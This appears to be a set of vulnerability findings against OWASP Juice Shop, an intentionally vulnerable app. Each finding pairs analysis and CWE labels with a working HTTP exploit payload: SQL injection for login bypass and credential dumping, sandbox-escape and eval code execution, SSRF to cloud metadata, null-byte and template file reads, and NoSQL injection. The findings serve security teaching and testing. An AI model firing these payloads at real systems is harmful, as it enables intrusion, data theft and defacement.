Title: SQL Injection in User Authentication Route
Analysis:
The login endpoint dynamically interpolates untrusted user input from `req.body.email` directly into a raw SQL query string passed to `models.sequelize.query`. There is no sanitization or parameterized querying applied to `req.body.email`.

Data Flow:
- Source: `req.body.email` in `login()` route handler.
- Sanitization/Validation: None.
- Sink: `models.sequelize.query()` executing raw SQL string concatenation.

An attacker can provide SQL injection sequences to manipulate the query logic, bypass authentication, and log in as the administrator.

Conceptual Exploit Payload:
POST /rest/user/login HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "email": "admin@juice-sh.op'--",
  "password": "foo"
}
Snippet: models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
VulnType: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Title: Remote Code Execution via Insecure Sandbox Evaluation in B2B Order Route
Analysis:
The B2B order processing endpoint evaluates untrusted user input `body.orderLinesData` inside a Node.js `vm` context using the `notevil` library (`safeEval`). The `notevil` package is insecure-by-design and subject to well-documented sandbox escapes via constructor/prototype navigation (e.g., accessing `Function` constructor through objects/functions accessible in the scope), allowing an attacker to achieve arbitrary code execution on the host server.

Data Flow:
- Source: `req.body.orderLinesData` in `b2bOrder()` POST handler.
- Sanitization/Validation: None.
- Sink: `vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })`.

An attacker can send a crafted JavaScript payload inside `orderLinesData` that escapes the `notevil` sandbox and executes commands or reads sensitive system files.

Conceptual Exploit Payload:
POST /data/b2b-order HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "orderLinesData": "this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()"
}
VulnType: CWE-94: Improper Control of Generation of Code ('Code Injection')

Title: Server-Side Code Injection via User Profile Evaluation
Analysis:
The user profile rendering handler checks if the authenticated user's `username` matches the pattern `#{...}`. If it matches, the code extracts the content between `#{` and `}` and evaluates it directly using JavaScript's native `eval()`. Because the username can be updated by any user via `updateUserProfile` (`/profile`), this enables remote code execution inside the Node.js runtime.

Data Flow:
- Source: `req.body.username` supplied when updating user profile (persisted in database).
- Sanitization/Validation: None; the application explicitly checks for the `#{...}` template syntax and extracts the inner string.
- Sink: `username = eval(code)` in `getUserProfile()`.

An attacker can update their username to a payload containing arbitrary Node.js code and subsequently request `/profile` to execute system commands.

Conceptual Exploit Payload:
Step 1:
POST /profile HTTP/1.1
Host: target.example.com
Cookie: token=<valid_user_jwt>
Content-Type: application/x-www-form-urlencoded

username=#{global.process.mainModule.require('child_process').execSync('id').toString()}

Step 2:
GET /profile HTTP/1.1
Host: target.example.com
Cookie: token=<valid_user_jwt>
VulnType: CWE-94: Improper Control of Generation of Code ('Code Injection')

Title: SQL Injection in Product Search Route
Analysis:
The product search endpoint extracts the search criteria query parameter `q` from `req.query.q` and concatenates it directly into a raw SQL query executed by `models.sequelize.query`. While the string is truncated to 200 characters, no escaping or parameterized binding is performed.

Data Flow:
- Source: `req.query.q` via HTTP GET request query parameter.
- Sanitization/Validation: Length truncation only (<= 200 characters); no SQL escaping or parameterization.
- Sink: `models.sequelize.query()` executing raw SQL string.

An attacker can supply SQL injection payloads to extract sensitive records from other database tables (such as users and credentials) via UNION-based SQL injection.

Conceptual Exploit Payload:
GET /rest/products/search?q=')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users-- HTTP/1.1
Host: target.example.com
Snippet: models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
VulnType: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Title: Arbitrary File Overwrite via Zip Slip in Zip Extraction
Analysis:
The `extractZipBuffer` function extracts zip file entries by appending `entry.path` directly into the destination path `'uploads/complaints/' + fileName`. While it checks `absolutePath.includes(path.resolve('.'))`, this check only ensures the destination is located somewhere within the application root directory rather than enforcing that the extracted file stays strictly inside the designated `'uploads/complaints/'` folder.

Data Flow:
- Source: Uploaded `.zip` file buffer via `handleZipFileUpload` multipart POST request.
- Sanitization/Validation: `absolutePath.includes(path.resolve('.'))` checks if the path is within the app root, failing to prevent traversal out of `uploads/complaints/`.
- Sink: `fs.createWriteStream('uploads/complaints/' + fileName)` extracting the entry to disk.

An attacker can supply a zip file containing an entry with path traversal sequences (e.g. `../../ftp/legal.md` or application source files) to overwrite critical application files (Zip Slip).

Conceptual Exploit Payload:
A ZIP archive containing an entry with relative pathname:
`../../ftp/legal.md` containing replacement content.
Uploaded via:
POST /file-upload HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="file"; filename="exploit.zip"
Content-Type: application/zip

[ZIP binary containing entry "../../ftp/legal.md"]
------WebKitFormBoundaryX--
VulnType: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Title: Server-Side Request Forgery (SSRF) in Profile Image URL Upload Route
Analysis:
The `profileImageUrlUpload` endpoint accepts an arbitrary URL via `req.body.imageUrl` from an authenticated user and performs a server-side HTTP request via `fetch(url)` without validating the protocol scheme, target IP address, or preventing access to internal private IP ranges or cloud metadata endpoints.

Data Flow:
- Source: `req.body.imageUrl` in POST request.
- Sanitization/Validation: None.
- Sink: `const response = await fetch(url)`.

An attacker can provide URLs targeting internal infrastructure or metadata APIs (e.g., AWS EC2 metadata at `http://169.254.169.254`) to exfiltrate internal information or interact with unexposed internal services.

Conceptual Exploit Payload:
POST /profile/image/url HTTP/1.1
Host: target.example.com
Cookie: token=<valid_user_jwt>
Content-Type: application/json

{
  "imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

Title: Arbitrary File Disclosure via Null Byte Truncation in Public File Server
Analysis:
The file server endpoint for public files checks if the requested filename parameter ends with an allowlisted extension (`.md` or `.pdf`). However, immediately after passing this check, the application invokes `security.cutOffPoisonNullByte(file)` to strip everything starting from an injected null byte delimiter before resolving and serving the file with `res.sendFile(path.resolve('ftp/', file))`.

Data Flow:
- Source: `params.file` in `servePublicFiles()`.
- Sanitization/Validation: `endsWithAllowlistedFileType(file)` verifies `.md` or `.pdf` suffix, but this is bypassed by appending null bytes (`%2500.md`).
- Sink: `res.sendFile(path.resolve('ftp/', file))`.

An attacker can request non-allowlisted sensitive files stored in the FTP directory (such as backup files, source files, or credentials) by appending a null byte sequence and an allowlisted extension.

Conceptual Exploit Payload:
GET /ftp/package.json.bak%2500.md HTTP/1.1
Host: target.example.com
VulnType: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Title: NoSQL Injection in Product Reviews Update Route
Analysis:
The `updateProductReviews` route handler uses the unvalidated user input `req.body.id` directly as the `_id` query selector in `db.reviewsCollection.update` with `{ multi: true }`. Because `req.body.id` can be parsed as an object containing query operators (such as `{ "$ne": -1 }`), the query selector matches all documents in the collection, leading to widespread unauthorized tampering of all reviews.

Data Flow:
- Source: `req.body.id` in HTTP PATCH / PUT request.
- Sanitization/Validation: None; the input is not converted to a string or verified against an ObjectId format.
- Sink: `db.reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } }, { multi: true })`.

An attacker can submit an object-based query operator in the JSON request body to overwrite every review in the system with an attacker-controlled message.

Conceptual Exploit Payload:
PATCH /rest/products/reviews HTTP/1.1
Host: target.example.com
Authorization: Bearer <valid_jwt>
Content-Type: application/json

{
  "id": { "$ne": -1 },
  "message": "Defaced by attacker!"
}
Snippet:
db.reviewsCollection.update( // vuln-code-snippet neutral-line forgedReviewChallenge
      { _id: req.body.id }, // vuln-code-snippet vuln-line noSqlReviewsChallenge forgedReviewChallenge
      { $set: { message: req.body.message } },
      { multi: true } // vuln-code-snippet vuln-line noSqlReviewsChallenge
    ).then(
VulnType: CWE-943: Improper Neutralization of Special Elements used in an SQL Command ('NoSQL Injection')

Title: NoSQL Injection via $where Clause in Product Reviews Route
Analysis:
The `showProductReviews` route concatenates untrusted route parameter `req.params.id` into a MongoDB `$where` expression string: `db.reviewsCollection.find({ $where: 'this.product == ' + id })`. MongoDB `$where` evaluations execute arbitrary JavaScript in the database context.

Data Flow:
- Source: `req.params.id` via GET request URL path.
- Sanitization/Validation: Input is only truncated to 40 characters (`utils.trunc(req.params.id, 40)`) and not escaped or validated as an integer.
- Sink: `db.reviewsCollection.find({ $where: 'this.product == ' + id })`.

An attacker can supply JavaScript payloads to inject code into the `$where` clause, allowing data exfiltration, blind Boolean evaluation, or denial of service via busy-wait loops (`sleep()`).

Conceptual Exploit Payload:
GET /rest/products/1%20%7C%7C%20sleep(2000)/reviews HTTP/1.1
Host: target.example.com
VulnType: CWE-943: Improper Neutralization of Special Elements used in an SQL Command ('NoSQL Injection')

Title: Local File Inclusion / Arbitrary File Read via Pug Template Layout Option
Analysis:
In `dataErasure.ts`, the router handles POST requests to trigger data erasure and accepts a `layout` parameter in `req.body.layout`. It attempts to blacklist files containing `'ftp'`, `'ctf.key'`, or `'encryptionkeys'`, but does not restrict file paths to a trusted directory. The `req.body` object (including `layout`) is passed directly to Express's `res.render('dataErasureResult', { ...req.body, ...themeVars })`. When the Pug template engine processes the `layout` option, it reads and renders the specified local file from disk. The first 100 characters of the rendered output are returned to the client in the HTTP response.

Data Flow:
- Source: `req.body.layout` in POST request to `/dataerasure`.
- Sanitization/Validation: Insufficient blacklist checking only for 'ftp', 'ctf.key', and 'encryptionkeys'.
- Sink: `res.render(...)` with `layout` option.

An attacker can specify arbitrary system files such as `/etc/passwd` to read sensitive file contents from the server.

Conceptual Exploit Payload:
POST /dataerasure HTTP/1.1
Host: target.example.com
Cookie: token=<valid_user_jwt>
Content-Type: application/json

{
  "layout": "/etc/passwd"
}
VulnType: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Title: Broken Object Level Authorization (IDOR) in Basket Retrieval Route
Analysis:
The `retrieveBasket` route retrieves basket and product data solely using `req.params.id` in `BasketModel.findOne` without checking whether the requesting user is the owner of the requested basket.

Data Flow:
- Source: `req.params.id` via GET request URL path `/rest/basket/:id`.
- Sanitization/Validation: None; no authorization or user-matching check is performed.
- Sink: `BasketModel.findOne({ where: { id }, ... })` returns basket data to the client.

An attacker can increment or enumerate the basket ID to read the cart contents and products of any other user in the store.

Conceptual Exploit Payload:
GET /rest/basket/1 HTTP/1.1
Host: target.example.com
Authorization: Bearer <attacker_jwt>
Snippet:
const id = req.params.id
      const basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })
VulnType: CWE-639: Authorization Bypass Through User-Controlled Key
